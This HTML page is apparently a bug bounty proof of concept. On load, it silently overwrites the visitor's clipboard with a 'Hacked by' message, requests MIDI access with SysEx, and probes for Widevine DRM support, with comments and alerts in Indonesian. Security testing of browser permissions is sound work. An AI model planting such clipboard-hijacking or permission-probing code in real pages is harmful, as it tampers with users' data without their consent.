<!DOCTYPE html>
<html>
<head>
  <title>BugBounty PoC - Clipboard, MIDI, EME</title>
</head>
<body>
  <h2>BugBounty PoC</h2>
  <p>Test otomatis 3 API: Clipboard, MIDI, dan EME</p>

  <script>
    // 1. Clipboard Write Test
    navigator.clipboard.writeText("Hacked by Arya - PoC Clipboard")
      .then(() => {
        console.log("✅ Clipboard overwritten tanpa prompt");
        alert("✅ Clipboard berhasil di-overwrite! Coba CTRL+V");
      })
      .catch(err => {
        console.log("❌ Clipboard gagal:", err);
      });

    // 2. MIDI API Test (with sysex)
    if (navigator.requestMIDIAccess) {
      navigator.requestMIDIAccess({ sysex: true })
        .then(midi => {
          console.log("✅ MIDI Access:", midi);
          alert("✅ Bisa akses MIDI + SysEx tanpa izin");
        })
        .catch(err => {
          console.log("❌ MIDI gagal:", err);
        });
    } else {
      console.log("MIDI API not supported");
    }

    // 3. EME Test (Widevine / DRM)
    if (navigator.requestMediaKeySystemAccess) {
      navigator.requestMediaKeySystemAccess("com.widevine.alpha", [{
        initDataTypes: ["cenc"],
        videoCapabilities: [{ contentType: "video/mp4; codecs=\"avc1.42E01E\"" }]
      }])
      .then(keySystemAccess => {
        console.log("✅ EME Access:", keySystemAccess.keySystem);
        alert("✅ EME terdeteksi: " + keySystemAccess.keySystem);
      })
      .catch(err => {
        console.log("❌ EME gagal:", err);
      });
    } else {
      console.log("EME API not supported");
    }
  </script>
</body>
</html>
